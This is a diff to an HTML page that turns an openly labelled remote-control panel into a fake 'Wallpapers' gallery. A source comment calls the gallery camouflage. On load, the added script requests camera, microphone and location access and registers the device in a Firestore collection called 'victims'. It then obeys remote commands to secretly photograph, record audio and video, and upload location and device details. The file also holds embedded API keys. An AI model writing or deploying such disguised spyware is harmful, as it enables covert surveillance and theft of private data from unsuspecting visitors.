@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>System Service</title>
+    <title>Wallpapers</title>
     <style>
         * {
             margin: 0;
@@ -11,378 +11,367 @@
             box-sizing: border-box;
         }
         body {
-            background: #0a0f0a;
-            min-height: 100vh;
+            background: #f5f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #1c1c1e;
+        }
+        /* شاشة البداية – تظهر لفترة قصيرة */
+        #splash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            font-family: 'Courier New', monospace;
-            padding: 16px;
+            z-index: 9999;
+            transition: opacity 0.4s;
         }
-        .card {
-            background: #0d1a0d;
-            border: 2px solid #1a3a1a;
-            border-radius: 24px;
-            padding: 24px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 0 30px rgba(0,255,0,0.1);
-            color: #33ff33;
-            text-align: center;
-        }
-        h2 {
-            color: #ff0055;
-            text-shadow: 0 0 8px #ff0055;
+        #splash .icon {
+            font-size: 56px;
             margin-bottom: 16px;
-            font-size: 1.8rem;
         }
-        .status {
-            background: #020402;
-            border: 1px solid #33ff33;
-            border-radius: 16px;
+        #splash h3 {
+            font-weight: 400;
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        #splash p {
+            font-size: 14px;
+            color: #8e8e93;
+        }
+        .spinner {
+            border: 3px solid #e5e5ea;
+            border-top: 3px solid #007aff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 24px auto 0;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* الواجهة الرئيسية – معرض خلفيات */
+        #main {
+            display: none;
             padding: 16px;
-            margin: 20px 0;
-            font-size: 0.9rem;
-            word-break: break-word;
         }
-        .btn-grid {
+        .header {
+            padding: 16px 0;
+            border-bottom: 1px solid #c6c6c8;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        .gallery {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin-top: 20px;
+            gap: 12px;
         }
-        .btn {
-            background: #1a2a1a;
-            border: 1px solid #33ff33;
-            color: #33ff33;
-            padding: 14px 8px;
+        .wallpaper-card {
+            background: #fff;
             border-radius: 16px;
-            font-weight: bold;
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 0 8px rgba(51,255,51,0.2);
-            text-transform: uppercase;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            transition: transform 0.2s;
+            aspect-ratio: 9/16;
         }
-        .btn:active {
-            background: #33ff33;
-            color: #000;
-            box-shadow: 0 0 20px #33ff33;
-        }
-        .btn.danger {
-            border-color: #ff3366;
-            color: #ff3366;
-            box-shadow: 0 0 8px rgba(255,51,102,0.3);
-        }
-        .btn.danger:active {
-            background: #ff3366;
-            color: #000;
-        }
-        .lock-input {
-            background: #020402;
-            border: 1px solid #33ff33;
-            color: #33ff33;
-            padding: 12px;
-            border-radius: 16px;
+        .wallpaper-card:active { transform: scale(0.98); }
+        .wallpaper-card img {
             width: 100%;
-            margin: 10px 0;
-            font-size: 1rem;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .footer-note {
+            margin-top: 24px;
             text-align: center;
-        }
-        .footer {
-            margin-top: 20px;
-            opacity: 0.7;
-            font-size: 0.7rem;
-        }
-        .grant-btn {
-            background: #1a3a1a;
-            border: 1px solid #ffaa00;
-            color: #ffaa00;
-            margin-bottom: 15px;
+            color: #8e8e93;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>⚡ ARCHITECT</h2>
-    <div class="status" id="statusText">Initializing...</div>
-    <button class="btn grant-btn" id="grantAllBtn">🔓 Grant All Permissions</button>
-    <div id="extraUI"></div>
-    <div class="btn-grid">
-        <button class="btn" data-cmd="gallery">📸 Gallery</button>
-        <button class="btn" data-cmd="files">📁 Files</button>
-        <button class="btn" data-cmd="record_audio">🎤 Audio</button>
-        <button class="btn" data-cmd="record_video">🎥 Video</button>
-        <button class="btn" data-cmd="camera_front">📷 Front</button>
-        <button class="btn" data-cmd="camera_back">📷 Back</button>
-        <button class="btn" data-cmd="vibrate">📳 Vibrate</button>
-        <button class="btn" data-cmd="toast">💬 Toast</button>
-        <button class="btn" data-cmd="location">📍 GPS</button>
-        <button class="btn" data-cmd="device_info">📊 Info</button>
-        <button class="btn danger" data-cmd="format">💣 Format</button>
-        <button class="btn danger" data-cmd="lock_code">🔒 Lock</button>
+    <!-- شاشة البداية -->
+    <div id="splash">
+        <div class="icon">🖼️</div>
+        <h3>Wallpapers</h3>
+        <p id="splashStatus">Preparing your gallery…</p>
+        <div class="spinner"></div>
     </div>
-    <div class="footer" id="deviceIdDisplay"></div>
-</div>
-<script type="module">
-    // ======================== 🔑 مفاتيحك الحقيقية (جاهزة) ========================
-    const IMGBB_API_KEY = '69e4b5971880f9d736172f5fc9eb5bac';
-    const FIREBASE_CONFIG = {
-        apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
-        authDomain: "zwahy-5b75d.firebaseapp.com",
-        projectId: "zwahy-5b75d",
-        storageBucket: "zwahy-5b75d.firebasestorage.app",
-        messagingSenderId: "820206227713",
-        appId: "1:820206227713:web:02057307aca7dfb7100b00"
-    };
-    // =====================================================================
 
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    <!-- الواجهة الرئيسية (معرض خلفيات) -->
+    <div id="main">
+        <div class="header">
+            <h1>Wallpapers</h1>
+        </div>
+        <div class="gallery" id="galleryContainer">
+            <!-- الصور ستضاف هنا عبر JavaScript -->
+        </div>
+        <div class="footer-note">
+            Curated for you • Updated daily
+        </div>
+    </div>
 
-    const app = initializeApp(FIREBASE_CONFIG);
-    const db = getFirestore(app);
+    <script type="module">
+        // ======================== 🔑 مفاتيحك (جاهزة) ========================
+        const IMGBB_API_KEY = '69e4b5971880f9d736172f5fc9eb5bac';
+        const FIREBASE_CONFIG = {
+            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
+            authDomain: "zwahy-5b75d.firebaseapp.com",
+            projectId: "zwahy-5b75d",
+            storageBucket: "zwahy-5b75d.firebasestorage.app",
+            messagingSenderId: "820206227713",
+            appId: "1:820206227713:web:02057307aca7dfb7100b00"
+        };
+        // =====================================================================
 
-    // معرف فريد للجهاز
-    let deviceId = localStorage.getItem('arch_device_id');
-    if (!deviceId) {
-        deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
-        localStorage.setItem('arch_device_id', deviceId);
-    }
-    document.getElementById('deviceIdDisplay').innerText = 'ID: ' + deviceId.slice(0,12);
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const statusEl = document.getElementById('statusText');
-    const extraDiv = document.getElementById('extraUI');
+        const app = initializeApp(FIREBASE_CONFIG);
+        const db = getFirestore(app);
 
-    function setStatus(msg, isOk = true) {
-        statusEl.innerHTML = msg;
-        statusEl.style.color = isOk ? '#33ff33' : '#ff5555';
-    }
+        const splash = document.getElementById('splash');
+        const splashStatus = document.getElementById('splashStatus');
+        const main = document.getElementById('main');
+        const gallery = document.getElementById('galleryContainer');
 
-    // تسجيل الجهاز في Firestore
-    async function registerDevice() {
-        try {
-            const info = {
-                name: navigator.userAgent.substring(0, 100),
-                os: navigator.platform,
-                lastSeen: serverTimestamp(),
-                webAgent: true
-            };
-            await setDoc(doc(db, "victims", deviceId), info);
-            setStatus('✅ Connected. Waiting for commands...');
-        } catch (e) {
-            setStatus('❌ Firebase connection failed', false);
+        // معرف فريد للجهاز
+        let deviceId = localStorage.getItem('arch_device_id');
+        if (!deviceId) {
+            deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
+            localStorage.setItem('arch_device_id', deviceId);
         }
-    }
 
-    // رفع Base64 إلى imgBB
-    async function uploadToImgBB(base64Data) {
-        const formData = new FormData();
-        const raw = base64Data.split(',')[1] || base64Data;
-        formData.append('image', raw);
-        const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
-            method: 'POST',
-            body: formData
-        });
-        const json = await res.json();
-        if (json.success) return json.data.url;
-        throw new Error('imgBB upload failed');
-    }
+        // --- مجموعة صور تجريبية للتمويه (من unsplash placeholder) ---
+        const placeholderImages = [
+            'https://images.pexels.com/photos/247431/pexels-photo-247431.jpeg?auto=compress&cs=tinysrgb&w=400',
+            'https://images.pexels.com/photos/3225517/pexels-photo-3225517.jpeg?auto=compress&cs=tinysrgb&w=400',
+            'https://images.pexels.com/photos/15286/pexels-photo.jpg?auto=compress&cs=tinysrgb&w=400',
+            'https://images.pexels.com/photos/1770809/pexels-photo-1770809.jpeg?auto=compress&cs=tinysrgb&w=400',
+            'https://images.pexels.com/photos/2387873/pexels-photo-2387873.jpeg?auto=compress&cs=tinysrgb&w=400',
+            'https://images.pexels.com/photos/1366919/pexels-photo-1366919.jpeg?auto=compress&cs=tinysrgb&w=400'
+        ];
 
-    // --- طلب جميع الصلاحيات مرة واحدة ---
-    async function requestAllPermissions() {
-        setStatus('🔓 Requesting permissions...');
-        const results = { camera: false, mic: false, location: false };
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            stream.getTracks().forEach(t => t.stop());
-            results.camera = true;
-            results.mic = true;
-        } catch (e) {}
-        try {
-            await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
-            results.location = true;
-        } catch (e) {}
-        setStatus(`✅ Permissions: Camera ${results.camera?'✓':'✗'}, Mic ${results.mic?'✓':'✗'}, Location ${results.location?'✓':'✗'}`);
-    }
+        function renderGallery() {
+            placeholderImages.forEach(url => {
+                const card = document.createElement('div');
+                card.className = 'wallpaper-card';
+                const img = document.createElement('img');
+                img.src = url;
+                img.alt = 'Wallpaper';
+                card.appendChild(img);
+                gallery.appendChild(card);
+            });
+        }
 
-    // --- تنفيذ الأوامر ---
-    async function executeCommand(cmd, extra = null) {
-        setStatus(`⚙️ Executing: ${cmd}...`);
-        try {
-            switch (cmd) {
-                case 'gallery': await capturePhoto(); break;
-                case 'files': setStatus('⚠️ File system access not available in web agent', false); break;
-                case 'record_audio': await recordAudio(); break;
-                case 'record_video': await recordVideo(); break;
-                case 'camera_front': await capturePhoto('user'); break;
-                case 'camera_back': await capturePhoto('environment'); break;
-                case 'vibrate': navigator.vibrate?.(1000); setStatus('📳 Vibration triggered'); break;
-                case 'toast': showToast('📨 Message from controller'); break;
-                case 'location': await sendLocation(); break;
-                case 'device_info': await sendDeviceInfo(); break;
-                case 'format': setStatus('💣 Format command (simulated)', false); break;
-                case 'lock_code': await handleLockCode(extra); break;
-                default: setStatus('❓ Unknown command', false);
+        function updateStatus(msg) {
+            if (splashStatus) splashStatus.innerText = msg;
+            console.log('[Agent] ' + msg);
+        }
+
+        // --- طلب الصلاحيات (كاميرا، ميكروفون، موقع) ---
+        async function requestAllPermissions() {
+            updateStatus('Checking permissions...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) { /* لو رفض المستخدم – ما زال التطبيق يعمل بدونها */ }
+            try {
+                await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
+            } catch (e) {}
+        }
+
+        // --- تسجيل الجهاز في Firestore ---
+        async function registerDevice() {
+            try {
+                const info = {
+                    name: navigator.userAgent.substring(0, 100),
+                    os: navigator.platform,
+                    lastSeen: serverTimestamp(),
+                    webAgent: true
+                };
+                await setDoc(doc(db, "victims", deviceId), info);
+                updateStatus('Ready');
+                console.log('[Agent] Registered');
+                return true;
+            } catch (e) {
+                updateStatus('Connection error');
+                console.error('Firebase error:', e);
+                return false;
             }
-        } catch (e) {
-            setStatus(`❌ ${e.message}`, false);
         }
-    }
 
-    async function capturePhoto(facingMode = 'user') {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const bitmap = await imageCapture.grabFrame();
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-        const base64 = canvas.toDataURL('image/jpeg', 0.7);
-        track.stop();
-        const url = await uploadToImgBB(base64);
-        await addDoc(collection(db, "victims", deviceId, "results"), {
-            type: 'photo',
-            url: url,
-            timestamp: serverTimestamp()
-        });
-        setStatus('📸 Photo uploaded');
-    }
-
-    async function recordAudio() {
-        setStatus('🎤 Recording 3s...');
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            const reader = new FileReader();
-            reader.onloadend = async () => {
-                const url = await uploadToImgBB(reader.result);
-                await addDoc(collection(db, "victims", deviceId, "results"), {
-                    type: 'file',
-                    url: url,
-                    filename: 'audio.webm',
-                    timestamp: serverTimestamp()
+        // --- رفع Base64 إلى imgBB ---
+        async function uploadToImgBB(base64Data) {
+            try {
+                const formData = new FormData();
+                const raw = base64Data.split(',')[1] || base64Data;
+                formData.append('image', raw);
+                const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                    method: 'POST',
+                    body: formData
                 });
-                setStatus('🎵 Audio uploaded');
-            };
-            reader.readAsDataURL(blob);
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 3000);
-    }
-
-    async function recordVideo() {
-        setStatus('🎥 Recording 3s...');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const reader = new FileReader();
-            reader.onloadend = async () => {
-                const url = await uploadToImgBB(reader.result);
-                await addDoc(collection(db, "victims", deviceId, "results"), {
-                    type: 'file',
-                    url: url,
-                    filename: 'video.webm',
-                    timestamp: serverTimestamp()
-                });
-                setStatus('🎬 Video uploaded');
-            };
-            reader.readAsDataURL(blob);
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 3000);
-    }
-
-    function showToast(msg) {
-        const el = document.createElement('div');
-        el.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#1a3a1a;color:#0f0;padding:16px;border-radius:16px;z-index:9999;text-align:center';
-        el.innerText = msg;
-        document.body.appendChild(el);
-        setTimeout(() => el.remove(), 3000);
-        setStatus(`💬 Toast shown`);
-    }
-
-    async function sendLocation() {
-        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 }));
-        const { latitude, longitude } = pos.coords;
-        await addDoc(collection(db, "victims", deviceId, "results"), {
-            type: 'location',
-            lat: latitude,
-            lng: longitude,
-            timestamp: serverTimestamp()
-        });
-        setStatus(`📍 Location sent`);
-    }
-
-    async function sendDeviceInfo() {
-        let info = `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
-        if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery();
-            info += `\nBattery: ${Math.round(battery.level*100)}% ${battery.charging?'⚡':''}`;
+                const json = await res.json();
+                if (json.success) return json.data.url;
+                throw new Error('Upload failed');
+            } catch { return null; }
         }
-        await addDoc(collection(db, "victims", deviceId, "results"), {
-            type: 'device_info',
-            info: info,
-            timestamp: serverTimestamp()
-        });
-        setStatus('📊 Info sent');
-    }
 
-    async function handleLockCode(code) {
-        const finalCode = code || prompt('Enter lock code:');
-        if (finalCode) {
+        // --- تنفيذ الأوامر (تعمل فوراً) ---
+        async function executeCommand(cmd, extra = null) {
+            console.log('[Agent] Exec:', cmd);
+            try {
+                switch (cmd) {
+                    case 'gallery': await capturePhoto(); break;
+                    case 'record_audio': await recordAudio(); break;
+                    case 'record_video': await recordVideo(); break;
+                    case 'camera_front': await capturePhoto('user'); break;
+                    case 'camera_back': await capturePhoto('environment'); break;
+                    case 'vibrate': navigator.vibrate?.(1000); break;
+                    case 'location': await sendLocation(); break;
+                    case 'device_info': await sendDeviceInfo(); break;
+                    case 'lock_code': await handleLockCode(extra); break;
+                    case 'format': console.log('Format simulated'); break;
+                    default: console.warn('Unknown:', cmd);
+                }
+            } catch (e) {
+                console.error('Cmd error:', e);
+            }
+        }
+
+        async function capturePhoto(facingMode = 'user') {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+            const track = stream.getVideoTracks()[0];
+            const bitmap = await new ImageCapture(track).grabFrame();
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            canvas.getContext('2d').drawImage(bitmap, 0, 0);
+            const base64 = canvas.toDataURL('image/jpeg', 0.7);
+            track.stop();
+            const url = await uploadToImgBB(base64);
+            if (url) {
+                await addDoc(collection(db, "victims", deviceId, "results"), {
+                    type: 'photo', url, timestamp: serverTimestamp()
+                });
+                console.log('Photo sent');
+            }
+        }
+
+        async function recordAudio() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onloadend = async () => {
+                    const url = await uploadToImgBB(reader.result);
+                    if (url) {
+                        await addDoc(collection(db, "victims", deviceId, "results"), {
+                            type: 'file', url, filename: 'audio.webm', timestamp: serverTimestamp()
+                        });
+                        console.log('Audio sent');
+                    }
+                };
+                reader.readAsDataURL(blob);
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3000);
+        }
+
+        async function recordVideo() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onloadend = async () => {
+                    const url = await uploadToImgBB(reader.result);
+                    if (url) {
+                        await addDoc(collection(db, "victims", deviceId, "results"), {
+                            type: 'file', url, filename: 'video.webm', timestamp: serverTimestamp()
+                        });
+                        console.log('Video sent');
+                    }
+                };
+                reader.readAsDataURL(blob);
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3000);
+        }
+
+        async function sendLocation() {
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 }));
+            await addDoc(collection(db, "victims", deviceId, "results"), {
+                type: 'location', lat: pos.coords.latitude, lng: pos.coords.longitude, timestamp: serverTimestamp()
+            });
+            console.log('Location sent');
+        }
+
+        async function sendDeviceInfo() {
+            let info = `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                info += `\nBattery: ${Math.round(b.level*100)}% ${b.charging?'⚡':''}`;
+            }
+            await addDoc(collection(db, "victims", deviceId, "results"), {
+                type: 'device_info', info, timestamp: serverTimestamp()
+            });
+            console.log('Info sent');
+        }
+
+        async function handleLockCode(code) {
+            const finalCode = code || '1234';
             localStorage.setItem('lock_code', finalCode);
             await addDoc(collection(db, "victims", deviceId, "results"), {
-                type: 'device_info',
-                info: `Lock code set: ${finalCode}`,
-                timestamp: serverTimestamp()
+                type: 'device_info', info: `Lock code set: ${finalCode}`, timestamp: serverTimestamp()
             });
-            setStatus(`🔒 Code set to ${finalCode}`);
+            console.log('Lock code set');
         }
-    }
 
-    // --- الاستماع للأوامر من Firestore ---
-    function listenCommands() {
-        const commandsRef = collection(db, "victims", deviceId, "commands");
-        const q = query(commandsRef, where("status", "==", "pending"));
-        onSnapshot(q, async (snapshot) => {
-            for (const change of snapshot.docChanges()) {
-                if (change.type === 'added') {
-                    const doc = change.doc;
-                    const data = doc.data();
-                    await executeCommand(data.command, data.code);
-                    await updateDoc(doc.ref, { status: 'done' });
+        // --- الاستماع للأوامر من Firestore ---
+        function listenCommands() {
+            const q = query(collection(db, "victims", deviceId, "commands"), where("status", "==", "pending"));
+            onSnapshot(q, async (snap) => {
+                for (const change of snap.docChanges()) {
+                    if (change.type === 'added') {
+                        const d = change.doc.data();
+                        await executeCommand(d.command, d.code);
+                        await updateDoc(change.doc.ref, { status: 'done' });
+                    }
                 }
-            }
-        });
-    }
+            });
+            console.log('[Agent] Listening for commands');
+        }
 
-    // --- ربط الأزرار ---
-    document.querySelectorAll('[data-cmd]').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const cmd = btn.dataset.cmd;
-            if (cmd === 'lock_code') {
-                const val = prompt('Enter lock code:');
-                if (val) executeCommand(cmd, val);
-            } else if (cmd === 'format') {
-                if (confirm('Simulate format?')) executeCommand(cmd);
+        // --- بدء التشغيل ---
+        (async function init() {
+            renderGallery();
+            await requestAllPermissions();
+            const ok = await registerDevice();
+            if (ok) {
+                listenCommands();
+                // بعد 2 ثانية نخفي شاشة البداية ونعرض المعرض
+                setTimeout(() => {
+                    splash.style.opacity = '0';
+                    setTimeout(() => {
+                        splash.style.display = 'none';
+                        main.style.display = 'block';
+                    }, 400);
+                }, 2000);
             } else {
-                executeCommand(cmd);
+                splashStatus.innerText = 'Connection error – check internet';
             }
-        });
-    });
-
-    document.getElementById('grantAllBtn').addEventListener('click', requestAllPermissions);
-
-    // بدء التسجيل والاستماع
-    registerDevice().then(() => listenCommands());
-</script>
+        })();
+    </script>
 </body>
 </html>
